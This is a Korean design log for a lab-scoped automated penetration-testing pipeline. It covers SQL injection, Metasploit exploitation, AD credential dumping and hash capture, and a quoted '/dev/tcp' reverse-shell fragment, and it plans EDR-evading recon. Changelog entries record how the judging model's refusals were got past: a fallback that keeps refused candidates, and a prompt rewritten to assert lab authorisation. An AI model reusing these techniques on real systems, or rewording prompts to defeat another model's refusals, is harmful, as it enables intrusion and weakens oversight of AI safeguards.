| 2026-08-09 | ad_enum.py/lateral_movement.py/sniffing.py 구조/코드 작성 (netexec/impacket/bloodhound-python/responder/tshark). AD 랩이 없어 실전 검증은 보류 (25절) | 구현됨(미검증), AD 랩 준비 후 실측 필요 |
| 2026-08-09 | shell_manager.py: pwncat-cs 실전 구축 시도(Python 3.13 호환성 패치 2건 + crypt shim 성공, 리버스쉘 연결은 즉시 끊김 - pty 부재 추정), 최종적으로 msfconsole -x 체이닝 패턴으로 구현 (26절) | 구현됨, pwncat 경로는 보류 |
| 2026-08-09 | 대화형 도구(pwncat-cs 등)는 사람이 직접 SSH로 붙어서 쓰도록 Kali에 SSH 활성화(호스트 키 재생성 후). 호스트<->Kali 접속 확인 완료 (26절) | 확정, 구현됨 |
| 2026-08-09 | env/kali_ssh.py 추가 - paramiko invoke_shell()로 진짜 pty 붙인 대화형 세션(send/expect). pwncat-cs로 실측했더니 pty를 줘도 "channel unexpectedly closed"가 동일 재현 - pty 부재설 반증, 원인은 pwncat 자체 로직으로 추정 (27절) | InteractiveSSHSession 구현/검증됨, pwncat 원인은 미해결 |
| 2026-08-10 | web_exploit.py 구현 - sqlmap --forms, findings를 exploitation stage에 남겨 reporting.py 자동 통합. Kioptrix2 실전 검증 중 기본값(level=2/risk=1)이 실제 취약점을 놓치는 걸 발견해서 level=5/risk=3으로 수정 (28절). MVP 전 모듈 구현 완료(AD 3개는 미검증) | 확정, 구현됨, 실전 검증 완료 |
| 2026-08-10 | save_report()에 vm_names 옵션 추가 - 리포트 저장 직후 대상 VM 정상종료(Kali는 공용이라 제외) (29절) | 확정, 구현됨 |
| 2026-08-10 | core/progress.py + run_pipeline.py 추가 - 전체 킬체인 오케스트레이터, Metasploitable2로 첫 자동 end-to-end 실전 검증 완료(25분) (30절) | 확정, 구현됨, 검증됨 |
| 2026-08-10 | vuln_analysis._judge_all(): LLM 판정이 refusal 등으로 실패하면 후보를 버리지 않고 searchsploit 매칭 기반 폴백 판정(_fallback_verdict)으로 대체 - "Backdoor" 제목 후보에서 실측으로 발견한 버그 수정 (30절) | 확정, 구현됨, 재검증 필요 |
| 2026-08-10 | run_pipeline.py에 VM 기동+도달성 확인 단계(총 8단계) + 대화형 모드(인자 없이 실행하면 VM 목록에서 골라 MAC 기반 IP 자동탐지) 추가 (32절) | 확정, 구현됨 |
| 2026-08-10 | vuln_analysis._build_prompt(): "Backdoor" 제목 후보에서 LLM이 stop_reason=refusal로 거부하는 문제를, 승인된 랩 맥락 명시+"생성 아닌 평가"로 역할 재구성+검색결과 인용 격리로 수정. 실제 PoC 코드도 같이 보여줘서 판정 정확도 향상(수정 필요 여부까지 반영) | 확정, 구현됨 |
| 2026-08-10 | env/setup_doctor.py 추가 - VM 설치/부팅/연결성 문제 진단용 에이전틱 툴콜 루프(스크린샷 포함). core/llm_client.call_with_tools() 신설(항상 종량제 API, 구독 경로는 커스텀 도구 스키마 노출 불가). AD-DC01 재설치 상태로 실전 검증 완료 (33절) | 확정, 구현됨, 검증됨 |
| 2026-08-10 | AD-DC01 Windows Server 무인설치 "OS 못 찾음" 부팅 실패 - autounattend.xml의 수동 2파티션 구성을 단일 파티션으로 교체해서 해결 (34절) | 확정, 해결됨 |
| 2026-08-10 | shell_manager.py를 msfrpcd(Metasploit RPC 데몬) + pymetasploit3 기반으로 재설계 - 진짜 재연결 가능한 세션(별도 프로세스에 걸쳐 유지). RPC 메커니즘 실측 검증됨, 깨끗한 세션 획득 end-to-end는 타겟 불안정성으로 재검증 필요 (35절) | 구현됨, 세션 획득 재검증 필요 |
| 2026-08-10 | AD-DC01을 goadlab.local 도메인 컨트롤러로 승격 완료 - Kali에서 pywinrm으로 원격 실행, 재부팅 유발 작업은 예약 작업으로 우회. LDAP rootDSE로 최종 검증 (36절). AD 랩 준비 완료 | 확정, 검증됨 |
| 2026-08-11 | exploitation.exploit_target()의 stop_at_first_success 기본값을 True->False로 변경, run_pipeline.py는 성공한 모든 Metasploit 경로에 대해 post_exploit 반복, post_exploit.attempt_privesc_candidates() 추가(권한상승 후보를 전부 실제 시도, 첫 성공에서 안 멈춤) - "가능한 모든 취약점을 분석"이 목표라는 사용자 방침 반영 | 확정, 구현됨 |
| 2026-08-11 | ad_enum.py/lateral_movement.py/sniffing.py를 AD-DC01(goadlab.local)로 실전 검증 완료 - 버그 3개 수정(bloodhound -dc/-o 플래그, sniffing.py sudo 비밀번호) (37절). DESIGN.md 25절 TODO 해소 | 확정, 검증됨 |
| 2026-08-11 | OWASP Juice Shop 랩 추가 - Kali에 Docker + bkimminich/juice-shop, Kali 자신의 hostonly IP 3000번 포트에 바인딩(macvlan은 호스트-컨테이너 통신 제약+중첩가상화 리스크로 기각). 자동 대상 탐지에는 안 잡힘(Kali IP라서) - 수동 지정 필요 (38절) | 확정, 구현됨 |
| 2026-08-11 | RAG(knowledge_base.py) 구현 시 벡터 스토어는 LanceDB 사용 (9절) | 확정, 구현은 아직 안 함 |
| 2026-08-11 | web_exploit.py에 probe_json_endpoint() 추가(SPA/JSON API용) - --ignore-code=401,403 기본 추가 + 인라인 injectable 메시지 파싱 추가. Juice Shop 로그인 email 필드 SQLi 실제 확인 (39절) | 확정, 구현됨, 검증됨 |

## 24. 향후 TODO 목록 (실행 순서와 무관, 생기는 대로 추가)

이 섹션은 22절(특정 시점 스냅샷)과 달리 계속 갱신되는 살아있는 TODO 목록이다.

### OWASP Juice Shop 랩 추가 (사용자 요청, 2026-08-10)
`web_exploit.py`(sqlmap 기반 SQLi)를 Kioptrix2 말고 더 현대적인 웹 취약점
스펙트럼(XSS, IDOR, 인증 우회, 접근제어 등 SQLi 외의 것들)으로도 검증해볼
필요가 있음 - OWASP Juice Shop(의도적으로 취약하게 만든 현대 웹앱, Docker/Node
로 가볍게 띄울 수 있음)을 받아서 타겟으로 추가할 것. Kioptrix2보다 훨씬
가벼워서(단일 컨테이너/프로세스) 리소스 부담도 적음 - 다운로드/실행 방법
확인부터 시작.

### 조용한(stealth) 권한상승 정찰 대안 (사용자 요청, 2026-08-09)
`post_exploit.py`의 `run_linpeas_via_msf_session()`은 linpeas.sh를 사용하는데,
linpeas는 매우 noisy하다(대상 파일시스템을 광범위하게 훑고, 잘 알려진 스크립트라
EDR/블루팀에 시그니처로 잡히기 쉽고, 디스크에 파일을 떨어뜨림 - IOC를 남김).
**지금은 기본값으로 계속 사용**하되, 다음을 나중에 구조화해서 추가한다:

- **조용한 대안 열거 방식**: 파일을 아예 업로드하지 않고 meterpreter `-C`로
  개별 명령(`sysinfo`, `getuid`, `ls -la /etc/sudoers` 등 필요한 것만 선별)을
  직접 실행하는 최소 열거 경로. linpeas처럼 다 훑지 않고 후보 몇 개만 확인 -
  느리지만 흔적이 훨씬 적음.
- **선택 시점**: (a) 환경설정/인게이지먼트 시작 단계에서 "이 고객은 stealth
  요구사항이 있음"으로 미리 지정 가능해야 하고, (b) 진행 도중 어느 시점에서든
  (예: 초기 recon 후 고객이 "이제부터 조용히 해달라"고 요청) 전환 가능해야
  한다 - 처음부터 끝까지 고정된 모드가 아니라 언제든 스위치 가능해야 함.
- **구조 아이디어(구현은 나중)**: 인게이지먼트 메타데이터(engagement.py 또는
  별도 설정)에 `noise_profile: "normal" | "stealth"` 같은 필드를 두고,
  `post_exploit.py`가 이 값을 보고 linpeas 경로 vs 최소 열거 경로 중 선택하게
  만드는 것. `run_linpeas_via_msf_session()`과 나란히 조용한 버전 함수를 하나
  더 만들고, 상위 파이프라인(향후 orchestrator)이 노이즈 프로파일에 따라
  분기하는 형태가 자연스러워 보임. 지금은 함수를 억지로 나누지 않고 이 설계
  의도만 기록해둔다 - 실제 구현은 이 기능이 필요해질 때 진행.

### AD 랩(도메인 컨트롤러 + 윈도우 멤버 호스트) 준비 후 실전 검증 (2026-08-09)
`ad_enum.py`/`lateral_movement.py`/`sniffing.py`를 구조/코드로 먼저 작성했지만
(사용자 요청: "구조/코드만 먼저 작성, 실전 검증은 나중에" - 25절), 이 랩에
Windows AD 환경이 아직 없어서 전혀 실행해보지 못했다. post_exploit.py를
6번의 실전 재검증으로 겨우 완성한 전례(21절)를 보면, 이 세 모듈도 실제로
돌려보면 최소 몇 개의 quoting/파싱/도구 인자 버그가 나올 가능성이 높다.
AD 랩(도메인 컨트롤러 1대 + 윈도우 멤버 1대 이상)이 준비되면 반드시:
1. `netexec smb` 인증/enum 명령이 실제 출력 형식과 맞는지 확인 (`[+]`,
   `(Pwn3d!)` 같은 성공/관리자 판정 마커는 netexec 버전에 따라 바뀔 수 있음)
2. `impacket-secretsdump`/`GetUserSPNs`/`GetNPUsers`의 실제 출력 형식과
   `_parse_secretsdump()` 등 파싱 함수가 맞는지 확인
3. `responder`/`tshark`가 실제로 root 권한(sudo)으로 인터페이스에 접근
   가능한지, 로그 파일 경로(`RESPONDER_LOG_DIR`)가 Kali 버전과 맞는지 확인
4. 계정 잠금 임계치를 가늠해서 lateral_movement.py에 시도 횟수 제한/딜레이
   추가 (8-3절 TODO)

## 25. AD/멀티호스트 모듈 구현 (ad_enum.py / lateral_movement.py / sniffing.py)

DESIGN.md 8/8-1/8-2/8-3절에서 이미 합의된 설계(netexec/bloodhound-python/
impacket/responder/tshark 사용, BloodHound는 Neo4j 없이 JSON만, 계정 잠금
리스크 때문에 대상 간 순차 처리)를 그대로 구현했다. **AD 랩이 없어서 실전
검증은 못 했음** - 위 TODO 항목 참고.

- **`ad_enum.py`**: `DomainCredential` 데이터클래스 + `build_auth_args()`(netexec
  인증 인자 조립, cred=None이면 익명/null 세션) 공용 헬퍼. `enumerate_domain()`
  (netexec smb --shares --users), `collect_bloodhound_data()`(job_runner로 감시,
  --zip으로 JSON만 수집), `find_kerberoast_targets()`/`find_asrep_roastable_users()`
  (impacket-GetUserSPNs/GetNPUsers) - 후자는 크레덴셜 없이 사용자 목록만으로도
  시도 가능(사전인증 비활성 계정이면 그 자체로 티켓을 내줌).
- **`lateral_movement.py`**: `ad_enum.build_auth_args()`를 재사용해서 인증 인자
  중복 조립을 피함. `try_credential_on_target()`(netexec smb, "(Pwn3d!)" 출력으로
  관리자 권한 판정), `execute_command()`(netexec -x), `dump_local_secrets()`
  (impacket-secretsdump, SAM 덤프 라인 `user:rid:lm:nt:::` 파싱해서
  credentials.jsonl에 재기록 - 머신 계정(`$`로 끝나는 이름)은 제외). 모듈
  docstring에 "대상 간 반드시 순차 호출" 명시(8-3절 lockout 리스크).
- **`sniffing.py`**: responder(LLMNR/NBT-NS -> NTLMv2 해시)와 tshark(FTP/HTTP
  Basic 평문 인증)를 **순차로**(동시 실행 금지) 돌림 - Kali 부하를 하나씩만
  유지한다는 사용자 방침을 이 모듈에도 그대로 반영. NTLMv2 해시는 필드를
  세밀하게 쪼개지 않고 hashcat이 요구하는 전체 라인을 그대로 secret으로
  보존(파싱 정확도보다 해시 무결성이 중요해서). FTP/HTTP Basic 파서는 순수
  함수라 VM 없이 합성 데이터로 단위 검증 완료 - 실제 tshark 출력 형식과
  맞는지는 AD 랩에서 재확인 필요.

## 26. shell_manager.py — pwncat-cs 조사, Python 3.13 호환성 패치 2건, SSH 접근으로 전환

`shell_manager.py`는 원래 pwncat-cs로 "진짜 지속 가능한 세션"을 만들 계획이었다
(사용자가 실전 구축 선택). Kali에 설치하고 Python 3.13 호환성 버그를 로컬
소스 패치로 2건 고쳤다(`pkgutil.walk_packages()`가 제거된
`loader.find_module()`를 쓰던 걸 `importlib.import_module()`로 교체 -
`pwncat/commands/__init__.py`, `pwncat/manager.py` 둘 다) + `crypt` 모듈 제거
(PEP 594) 대응으로 `legacycrypt`를 `crypt`로 재노출하는 shim 추가
(`/home/kali/.local/lib/python3.13/site-packages/crypt.py`). 여기까지는 성공 -
pwncat-cs가 정상 기동하고 리스너도 뜬다.

**막힌 지점**: Metasploit로 vsftpd 백도어를 트리거해서 리버스쉘을 pwncat
리스너로 쐈더니 연결은 받는데("received connection from ...") 곧바로 "channel
unexpectedly closed"로 끊긴다. `nohup ... & disown -a`로 세션 종료 시 자식
프로세스가 죽는 문제(post_exploit.py 21절과 같은 패턴)를 적용해도 동일하게
재현됨 - pwncat 자신도 "Input is not a terminal (fd=0)" 경고를 내는 걸 보면,
guestcontrol의 비대화형 실행 환경이 pwncat이 기대하는 실제 pty와 안 맞아서
채널 프로빙이 실패하는 것으로 추정(확정은 아님).

**결정**: 사용자가 대안 제시 - 대화형으로 설계된 도구는 억지로 완전 자동화하지
말고, **사용자가 직접 터미널로 붙어서 쓰도록** SSH 접근을 열어주는 하이브리드
방식으로 전환. Kali에 SSH 활성화(새 호스트 키 생성 후 - 이미지에 미리 구워진
키 재사용 방지, `systemctl enable --now ssh`), 호스트(Windows)에서
`192.168.56.101:22` 접속 확인 완료. 사용자는 `ssh kali@192.168.56.101`
(비밀번호 `kali`)로 접속해서 `pwncat-cs -lp <port>` 등을 직접 실행할 수 있다.
자동화(이 코드베이스)는 exploitation.py로 초기 접근을 확보하는 것까지 맡고,
대화형 조작이 필요한 부분은 사람이 이어받는 구조 - 이 SSH 경로로 실제
pwncat-cs 리버스쉘을 받아보는 검증은 아직 안 함(다음 TODO).

`shell_manager.py` 자체(완전 자동화 경로)는 post_exploit.py/flag_capture.py와
같은 msfconsole -x 체이닝 패턴을 `run_commands()`/`ShellSession`으로 일반화해서
구현했다 - 명령별 마커로 출력을 잘라내고, `sessions -c`(소문자, 타겟 OS 셸
명령) 인자의 작은따옴표를 표준 bash 이스케이프(`'\''`)로 안전하게 처리한다.
"진짜 재연결 가능한 세션"이라는 원래 목표는 이 경로로는 여전히 못 이룸(알려진
한계, 모듈 docstring 참고) - `ShellSession.run()`을 여러 번 부르면 매번
익스플로잇을 새로 실행하므로 1회성 익스플로잇(vsftpd 백도어 등)엔 두 번째
호출부터 안 맞음.

**TODO**: SSH 경로로 pwncat-cs 리버스쉘을 실제로 받아보는 검증. 또한
`sniffing.py`의 `sudo` 호출들이 비밀번호 없이 되는 걸 가정하고 작성됐는데,
오늘 확인한 바로는 Kali의 sudo가 비밀번호를 요구한다(`echo kali | sudo -S`
방식이 필요) - AD 랩 실전 검증 시 같이 고칠 것.

## 27. `env/kali_ssh.py` — paramiko로 진짜 pty를 붙인 대화형 세션 (사용자 제안)

사용자가 SSH로 직접 접속해서 pwncat-cs를 성공적으로 띄운 뒤(리스너까지 뜬 것
확인), "이걸 나중에 파이썬 코드로도 할 수 있게, 가능하면 모든 대화형 도구에
범용으로 쓸 수 있게" 만들어달라고 요청. `paramiko`(호스트 Python에 새로 설치)의
`invoke_shell()`로 SSH 채널에 **진짜 pty**를 요청해서 붙이는
`InteractiveSSHSession` 클래스를 만들었다 - `send(line)`/`expect(pattern,
timeout)`/`read_available()`로 사람이 터미널에서 타이핑/읽는 것과 같은 방식의
자동화를 제공. Kali 기본 zsh 프롬프트가 ANSI 색상 섞인 다단 박스라 매칭이
번거로워서, 접속 직후 `PS1`을 평문 마커(`PLAIN_PROMPT`)로 바꾸고, 모든 출력에서
ANSI 이스케이프 시퀀스를 정규식으로 제거해서 순수 텍스트만 다루게 함.

**기본 send/expect 자체는 완벽히 동작 확인**(`whoami && hostname` 테스트 성공).
`guest_control.py`를 대체하는 게 아니라 보완 - 빠른 단발 명령은 여전히
`run_in_kali()`가 SSH 핸드셰이크 비용 없이 더 간단함. 대화형 프로그램을 여러
턴에 걸쳐 구동해야 할 때만 이걸 쓴다.

**결정적인 발견**: 이 진짜 pty 세션으로 pwncat-cs를 구동하고 리버스쉘을
받아봐도 **26절에서 겪은 것과 똑같이 "channel unexpectedly closed"가
재현됐다.** 이건 중요한 정보다 - pty 부재가 원인이라는 26절의 추정이
**틀렸다는 뜻**. 진짜 pty를 줘도 똑같이 실패하므로, 문제는 pwncat-cs 자신의
채널 프로빙/핸드셰이크 로직(연결 직후 원격 셸의 종류/플랫폼을 판별하려고
뭔가를 주고받는 과정으로 추정)에 있거나, 우리가 보내는 리버스쉘 페이로드
(`bash -i >& /dev/tcp/...`)가 그 프로빙과 안 맞는 것으로 보인다 - 정확한 원인은
pwncat-cs 소스(channel/bind.py, manager.py의 세션 초기화 로직)를 더 들여다봐야
알 수 있음(미조사, 다음 TODO).

`InteractiveSSHSession` 자체는 pwncat 성패와 무관하게 **독립적으로 유용한
범용 자산**으로 남긴다 - 나중에 다른 대화형 도구(대화형 msfconsole, ftp/telnet
클라이언트, sqlmap 대화형 프롬프트 등)를 자동화할 때 재사용 가능.

## 28. web_exploit.py 구현 + 실전 검증 성공 (Kioptrix2) — MVP 마지막 모듈

vuln_analysis.py는 searchsploit(버전 기반 CVE 매칭)만 해서, Kioptrix2의 실제
알려진 공격 경로(로그인폼 SQL 인젝션, CVE 번호 없음)를 처음부터 못 잡았다
(exploitation.py 18절). sqlmap `--forms`(폼 자동 크롤링) + `--batch`(비대화형)로
이 공백을 메운다. sqlmap 자신이 "Parameter: ... / Type: ..."로 확정 메시지를
내므로 exploitation.py처럼 LLM 판정이 따로 필요 없다(searchsploit을 ground
truth로 쓰는 vuln_analysis.py와 같은 이유).

**findings는 `stage="exploitation"`에 남긴다** - 새 스테이지를 만들지 않고
exploitation.py와 같은 이벤트 taxonomy(`exploit_success`/`attempt_failed`)를
써서, reporting.py가 **코드 수정 없이** 이 결과도 킬체인에 자동 포함시킨다
(실제로 확인함 - report.md의 "Exploitation" 섹션에 SQLi 결과가 자연스럽게
같이 뜸).

**실전에서 잡은 버그**: 기본값을 `--level=2 --risk=1`(보수적)로 뒀더니
Kioptrix2의 실제 취약점(POST `uname` 파라미터, boolean-based blind)을 **못
찾았다** - risk=1은 OR 기반 페이로드를 테스트 안 해서 흔한 로그인 우회 SQLi
패턴을 놓친다. `--level=5 --risk=3`으로 올렸더니 정확히 잡았고, 백엔드까지
정확히 식별함(MySQL < 5.0.12, CentOS 4, Apache 2.0.52, PHP 4.3.9 - Kioptrix2의
실제 알려진 스택과 일치). 기본값을 `level=5 risk=3`으로 바꿈 - 이 케이스
실측 소요시간 113초라 시간 비용도 크지 않았음. **교훈**: sqlmap 같은 도구도
"기본값이면 되겠지"라고 가정하지 말고 실제 알려진 취약 대상으로 검증해야
한다는 게 이번에도 확인됨 (post_exploit.py 21절과 같은 패턴).

**신중하게 다룬 부분**: SQLi가 확인돼도 `--dump`/`--os-shell`까지는 자동으로
안 감(sqlmap이 배치모드에서 DBMS 식별까지는 하지만 데이터 추출은 안 함,
로그로 확인). exploitation.py의 Metasploit/PoC 자동실행과 다르게, SQLi는
대상 데이터베이스 전체를 건드릴 수 있어서 자동화 범위를 의도적으로 좁게 잡음
- 확인된 것 이상은 사람이 판단해서 진행.

이걸로 **DESIGN.md 10절의 MVP 범위(recon~reporting, AD/멀티호스트,
shell_manager, web_exploit) 전 모듈이 구현됐다.** AD 3모듈만 랩 부재로 실전
미검증 상태로 남음(25절).

## 29. reporting.py — 리포트 완료 시 대상 VM 정상종료 (사용자 요청)

리포트까지 끝난 인게이지먼트의 대상 VM을 계속 켜둘 이유가 없다(리소스 낭비 +
오래 켜둘수록 불안정/크래시 위험 - 20-2절). `save_report(engagement_id,
vm_names=[...])`에 `vm_names`를 넘기면 저장 직후 `shutdown_vm()`(정상종료
우선)으로 그 VM들을 끈다. Kali는 여러 인게이지먼트가 공유하는 공용 attacker
VM이라 여기서 자동으로 안 끔 - 호출자가 그 인게이지먼트가 실제 사용한
**대상** VM 이름만 넘겨야 한다. CLI: `python -m modules.reporting
<engagement_id> [vm_name...]`.

## 30. run_pipeline.py + core/progress.py — 전체 킬체인 오케스트레이터 + 진행상황 표시 (사용자 요청)

로컬에서 파이썬 파일을 직접 실행하면(대화형으로 단계별 보고를 받는 지금과
달리) 최종 결과가 나오기 전까지 뭘 하고 있는지 안 보인다는 문제 제기.
`core/progress.py`(단계 전환/중간 진행/경고를 일관된 형식으로 콘솔에 출력)를
만들고, 이걸 쓰는 `run_pipeline.py`(project root)를 새로 추가했다 - 대상
하나에 대해 recon(scope 등록) -> scanning -> vuln_analysis -> exploitation ->
(Metasploit 성공 시만) post_exploit -> flag_capture -> reporting을 순서대로
실행한다. 이미 검증된 개별 모듈 함수를 그대로 호출할 뿐 새 로직은 배선뿐.

post_exploit/flag_capture는 Metasploit 세션이 필요해서(msfconsole -x 세션은
스크립트 종료 시 끊김 - 18/21절), PoC 스크립트로 성공한 경우엔 건너뛴다.
어떤 모듈이 성공했는지는 `exploitation.py`의 `ExploitAttempt`에 없어서(method
필드가 없음 - 이미 검증된 코드라 안 건드림), findings.jsonl의
`exploit_success` 이벤트에서 `method`("Metasploit(모듈명)" 형식)를 다시 읽어
파싱한다.

**Metasploitable2 대상 실전 end-to-end 검증 완료**(1499초, 25분): scanning
581s -> vuln_analysis 221s(후보 27개) -> exploitation 635s(시도 4개, 이번엔
0개 성공) -> post_exploit/flag_capture 스킵 -> reporting(리포트 저장 + VM
정상종료).

### 부수적으로 발견한 실전 버그: LLM 판정 거부(refusal)로 유효한 후보가 통째로 사라짐

이 첫 자동 end-to-end 실행에서 vsftpd 2.3.4(port 21, 하루 종일 반복
성공했던 바로 그 백도어) 익스플로잇이 **한 번도 시도조차 안 됐다.**
원인 추적: `vuln_analysis._judge_candidate()`의 LLM 호출이 vsftpd(21)와
UnrealIRCd(6667/6697) 세 후보 모두에서 `stop_reason=refusal`로 거부됨(실측
확인, findings의 `judge_failed` 이벤트) - searchsploit 매칭 제목에
"Backdoor"가 들어간 게 원인으로 추정. searchsploit 자체는 정확히 찾았는데
(vsftpd: CVE-2011-2523), LLM 판정 실패 시 후보를 그냥 버리던 기존 로직
때문에 `candidate_ranked` 자체가 안 남았고, exploitation.py는 훨씬 가능성
낮은 다른 4개 후보(다 실패)만 시도함.

**수정**: `_judge_all()`이 판정 실패 후보를 버리는 대신 `_fallback_verdict()`로
대체하게 함 - searchsploit 매칭에 CVE 코드가 있으면 confidence=0.5, 없으면
0.3, risk="medium"인 대충의 판정을 만들어서 최소한 exploitation.py가 시도할
기회는 주게 함(rationale에 "LLM 판정 실패, 사람이 재확인 권장"이라고 명시).
**재검증은 아직 안 함** - 다음에 Metasploitable2로 파이프라인을 다시 돌려서
vsftpd가 이번엔 후보 목록에 들어가는지, exploitation.py가 실제로 시도하는지
확인해야 함(TODO).

## 31. AD 랩 구축 시작 — Windows Server 2022 단일 DC (사용자 요청)

25절/28절에서 미검증으로 남았던 AD 3모듈(ad_enum/lateral_movement/sniffing)을
실전 검증하기 위해 AD 랩을 구축하기 시작했다.

### 랩 선택 근거
가장 유명한 AD 펜테스트 랩인 GOAD(Game of Active Directory)를 먼저 검토했으나,
이 호스트의 총 RAM이 16GB(측정 확인)인데 GOAD의 가장 가벼운 변형(GOAD-Mini/
MINILAB)조차 권장 사양이 16GB라 호스트 OS+Kali 몫이 하나도 안 남는다 -
현실적으로 못 돌림. 대신 **Windows Server 2022 평가판 단일 도메인 컨트롤러**로
시작하기로 함(가장 전형적인 AD 랩 입문 구성, 리소스도 훨씬 가벼움 - DC 1대
4GB). 나중에 리소스가 되면 멤버 서버를 추가해서 확장 가능.

### ISO 확보
Windows Server 2025 평가판은 MS 등록 폼(이름/이메일 등 개인정보)을 거쳐야
다운로드 링크가 나와서, 개인정보를 대신 입력할 수 없어 사용자에게 확인 후
**등록이 필요 없는 Windows Server 2022 평가판**으로 전환. 공식 Microsoft
CDN(`software-download.microsoft.com`)의 직접 링크를 확보해서 등록 없이
다운로드 완료(5.17GB, `C:\Users\chuni\VirtualBox VMs\isos\
WindowsServer2022_Eval.iso`).

### VM 생성 — 완전 무인 설치(autounattend.xml)
다른 대상 VM들과 마찬가지로 코드/자동화 우선 원칙을 따라 GUI 클릭 설치 대신
무인 설치로 진행. `ad-lab/autounattend.xml` 작성 후(Windows Server 2022
SERVERSTANDARD 에디션 지정, Administrator 암호 설정, PS Remoting/WinRM
방화벽 허용을 specialize 패스에서 자동 실행), PowerShell의 내장 COM API
(`IMAPI2FS.MsftFileSystemImage` + `ADODB.Stream`/C# IStream 헬퍼로 브릿지)로
별도 도구 설치 없이 작은 ISO를 만들어 2번째 광드라이브로 붙였다(Windows
Setup은 부팅 시 아무 미디어에서나 autounattend.xml을 찾음).

VM 사양: `AD-DC01`, Windows2022_64, 4GB RAM, CPU 2개, 60GB 디스크(SATA),
hostonly 네트워크(다른 대상들과 같은 랩 네트워크, Kali가 도달 가능해야 함),
BIOS 펌웨어(Server 2022는 클라이언트용 Windows 11과 달리 TPM/Secure Boot
요구 없음 - EFI 안 씀).

**아직 검증 안 됨**: autounattend.xml이 실제로 무인 설치를 끝까지 성공시키는지
지금 확인 중(Windows Server 무인 설치는 보통 20~40분 소요, 실측 대기 중).
성공하면 다음 단계는 WinRM으로 붙어서 `Install-ADDSForest`로 도메인 컨트롤러
승격.

## 32. run_pipeline.py 보강 — VM 기동/도달성 확인 단계 + 대화형 모드 (사용자 요청)

두 가지 사용성 문제 지적을 받고 고쳤다:

1. **recon 전에 VM 기동/도달성 확인이 빠져있었음**: 기존엔 대상이 이미 켜져
   있고 도달 가능하다고 가정하고 바로 recon부터 시작했다. `run_pipeline()`에
   새 0단계("환경 확인")를 추가 - `vm_name`이 주어지면 꺼져 있을 때 자동으로
   켜고, `health_check.check_target_reachability()`로 ping 응답할 때까지
   기다린 뒤에야 recon으로 넘어간다(총 단계 수 7 -> 8).
2. **CLI 인자가 일반 사용자에겐 어려움**: 인자 없이 `python run_pipeline.py`를
   실행하면 대화형 모드로 들어가서, 등록된 VM 목록(공격자 VM인 kali는 제외)을
   보여주고 번호로 고르게 한다. IP를 몰라도 됨 - 고른 VM을 기동한 뒤
   `_resolve_target_ip()`가 그 VM의 MAC 주소로 랩 서브넷을 nmap 스캔해서 실제
   할당된 IP를 찾는다(DHCP가 매번 다른 IP를 줄 수 있어서 - Kioptrix2 실전에서
   직접 겪은 문제를 코드로 자동화함). 기존 CLI 인자 방식은 스크립팅/자동화용으로
   그대로 남겨둠(하위 호환).

`env/provision_target.py`에 `list_target_vms()`(kali 제외 목록), `get_mac_address()`
(콜론 구분 대문자 MAC, nmap 출력과 바로 비교 가능한 형식) 추가.

## 33. env/setup_doctor.py — 환경 설정 에이전틱 트러블슈터 (사용자 제안, 실전 검증 완료)

이 세션에서 임포트/설치한 VM마다 전부 다른 종류의 문제를 겪었다(Kioptrix1 NIC
드라이버, Kioptrix2 DHCP IP 재발견, msfconsole bootsnap, pwncat-cs Python 3.13
호환성, Windows Server 무인설치 부팅 실패). 근본 원인이 매번 완전히 달라서
`health_check.py`의 고정된 체크리스트로는 못 잡는 클래스의 문제 - 사람(이번
세션 내내는 LLM)이 "증상 관찰 -> 가설 -> 시도 -> 재관찰"을 반복하며 풀어온
패턴을 자동화했다.

**아키텍처 결정**: 이건 나머지 모듈(vuln_analysis.py 등)의 "단발성 프롬프트 ->
판정 1회" 패턴과 다르다 - 여러 턴에 걸친 진짜 에이전틱 툴콜 루프가 필요하다.
DESIGN.md 1절이 명시한 "전환 포인트"("실패하면 모델이 알아서 다른 접근을
시도하는 방식이 필요해지면 Agent SDK로 전환")에 정확히 해당하지만, 전체
파이프라인을 바꾸는 대신 이 모듈 하나로 범위를 좁혔다.

`core/llm_client.py`에 `call_with_tools()` 추가 - 구독(claude CLI headless) 경로는
커스텀 도구 스키마를 노출 못 해서(vuln_analysis.py가 tool_choice 강제 방식을
버린 이유와 같음 - 16절) **항상 종량제 API만 쓴다**. spend_tracker 상한/로그는
그대로 적용됨.

**도구/안전 범위**: `take_screenshot`(VBoxManage screenshotpng, base64 인코딩해서
이미지 블록으로 넘김 - 텍스트 로그로 안 보이는 부팅 화면을 직접 보게 하는 게
핵심), `check_vm_state`, `vm_power_action`(reset/poweroff/startvm만),
`check_reachability`, `run_in_kali`(읽기 전용 진단용), `wait`, `report_diagnosis`
(종료용). **디스크 재구성/설정파일 수정/파일 삭제 같은 되돌리기 어려운 행위는
도구로 안 줌** - 그 수준 조치가 필요하면 report_diagnosis로 사람에게 넘기게
설계. 모든 도구 호출+최종 진단을 findings.jsonl에 남김(stage="setup_doctor",
감사 가능).

**실전 검증**: AD-DC01 디스크 재구성 직후 재설치 상태를 진단시켰다. 스크린샷을
두 번 찍어서(5분 간격) 설치 진행률이 6%→19%로 정상 증가하는 걸 직접 비교
확인하고, 에러 없음을 정확히 판단해서 불필요한 개입 없이 마무리 - 도구 호출
4번, 비용 약 $0.06. 실전에서 버그 1개 발견/수정: `screenshotpng`는 호스트
(Windows)에 파일을 저장하는데 최초 구현이 Unix 스타일 `/tmp/` 경로를 써서
`VERR_PATH_NOT_FOUND`로 실패함 - `tempfile.gettempdir()`로 수정.

## 34. AD-DC01 부팅 실패 원인/해결 — autounattend.xml 파티션 구성

Windows Server 2022 무인설치가 "OS를 찾을 수 없음"으로 계속 실패했다(20-30%대에서
재부팅 후). 원인: `autounattend.xml`의 `DiskConfiguration`을 예전 방식(작은
System 파티션 500MB + Windows 파티션, 각각 수동 Active/Format 지정)으로 짰는데,
Windows 10/Server 2016+ 세대의 Setup 엔진은 부팅에 필요한 파티션들을 자기가
직접 관리하려는 경향이 있어서 수동으로 미리 만든 2파티션 구성과 충돌해 부팅
레코드가 제대로 안 써진 것으로 추정(확정 진단은 아님 - Windows 쪽 로그 접근이
어려워서 재현 실험으로 우회 확인). **단일 파티션(전체 디스크 Extend) + Active
플래그만 지정**하는 최신 권장 패턴으로 바꾸고 디스크를 완전히 새로 만들어
재설치하니 정상 진행됨(setup_doctor.py로 확인).

## 35. shell_manager.py 재설계 — msfrpcd(Metasploit RPC 데몬) 기반, 진짜 재연결 가능한 세션

기존 `msfconsole -x "...;exit"` 체이닝 패턴은 프로세스가 끝나면 세션 추적도
같이 끊기는 근본적 한계가 있었다(26절) - `post_exploit.py`/`flag_capture.py`가
